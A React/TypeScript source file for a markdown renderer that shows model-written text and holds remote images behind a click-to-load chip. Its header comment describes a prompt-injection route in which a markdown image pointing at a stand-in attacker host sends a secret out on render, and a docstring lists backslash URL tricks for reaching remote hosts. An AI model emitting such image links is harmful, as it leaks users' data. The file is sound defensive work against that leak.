// Markdown for text a model wrote (chat replies, assistant summaries, agent-written artifacts).
// Model output can carry a prompt injection, and `![](https://evil/?d=<secret>)` would send data
// out the moment it rendered. Remote images therefore show as a "Remote image: <host> · Load" chip;
// only a click loads them, for that message, through the backend (POST /api/remote-image), and they
// display from a blob: URL. The window's CSP allows no https: images at all.
import { ImageIcon } from "lucide-react";
import { createContext, memo, useContext, useEffect, useMemo, useState } from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { api } from "../lib/api";
import { remarkTaskCodes, TaskChip } from "./TaskChip";

/** Images that may load without asking: data:/blob: URLs, the app's own origin and this Mac's backend
 *  on 127.0.0.1 (which needs the session token). Decided on the URL the browser would actually load
 *  (resolved against the page), so `/\evil.example/x` or `\\evil.example` (browsers read
 *  backslashes as slashes) count as the remote hosts they are. */
export function isLocalImage(src: string | undefined | null, base: string = pageUrl()): boolean {
  const s = (src ?? "").trim();
  if (!s) return true;
  let u: URL;
  let b: URL;
  try {
    b = new URL(base);
    u = new URL(s, b);
  } catch {
    return false;
  }
  if (u.protocol === "data:" || u.protocol === "blob:") return true;
  if (u.username || u.password) return false;
  if (u.protocol === b.protocol && u.host === b.host && u.host !== "") return true; // same origin
  return (u.protocol === "http:" || u.protocol === "https:") && u.hostname === "127.0.0.1";
}

function pageUrl(): string {
  const href = typeof location !== "undefined" ? location.href : "";
  return /^[a-z][a-z0-9+.-]*:\/\//i.test(href) ? href : "http://127.0.0.1/";
}

function hostOf(src: string): string {
  try {
    return new URL(src, "http://127.0.0.1/").host || src;
  } catch {
    return src.slice(0, 60);
  }
}

const RemoteImages = createContext<{ allowed: boolean; allow: () => void }>({ allowed: false, allow: () => {} });

function RemoteImage({ src, alt }: { src: string; alt?: string }) {
  const { allowed, allow } = useContext(RemoteImages);
  const [url, setUrl] = useState<string | null>(null);
  const [error, setError] = useState<string | null>(null);
  useEffect(() => {
    if (!allowed) return;
    let gone = false;
    let made: string | null = null;
    api<Response>("/remote-image", { method: "POST", body: { url: src }, raw: true })
      .then((r) => r.blob())
      .then((b) => {
        if (gone) return;
        made = URL.createObjectURL(b);
        setUrl(made);
      })
      .catch((e) => !gone && setError(e?.message || "Couldn't load it"));
    return () => {
      gone = true;
      if (made) URL.revokeObjectURL(made);
    };
  }, [allowed, src]);
  if (url) return <img src={url} alt={alt ?? ""} className="max-w-full" />;
  return (
    <span className="chip inline-flex items-center gap-1 align-middle" title={src} data-remote-image={src}>
      <ImageIcon size={12} aria-hidden />
      <span>Remote image: {hostOf(src)}</span>
      {error ? <span className="text-bad">· {error}</span>
        : allowed ? <span className="text-muted">· loading…</span>
        : <>· <button type="button" className="text-action hover:underline" onClick={allow} title="Load the remote images in this message">Load</button></>}
    </span>
  );
}

const components: Components = {
  a: ({ node: _node, ...p }) => {
    // Task codes (see remarkTaskCodes) are chips that open the task.
    if (typeof p.href === "string" && p.href.startsWith("#task:")) return <TaskChip code={p.href.slice(6)} label={String(p.children ?? "")} />;
    return <a {...p} target="_blank" rel="noreferrer" />;
  },
  img: ({ node: _node, src, alt, ...p }) => {
    const s = typeof src === "string" ? src : undefined;
    return isLocalImage(s) ? <img src={s} alt={alt ?? ""} {...p} /> : <RemoteImage src={s!} alt={alt} />;
  },
};

/** ReactMarkdown with GFM, links in a new window and click-to-load remote images (per instance). */
export const SafeMarkdown = memo(function SafeMarkdown({ text }: { text: string }) {
  const [allowed, setAllowed] = useState(false);
  const value = useMemo(() => ({ allowed, allow: () => setAllowed(true) }), [allowed]);
  return (
    <RemoteImages.Provider value={value}>
      <ReactMarkdown remarkPlugins={[remarkGfm, remarkTaskCodes]} components={components}>{text}</ReactMarkdown>
    </RemoteImages.Provider>
  );
});
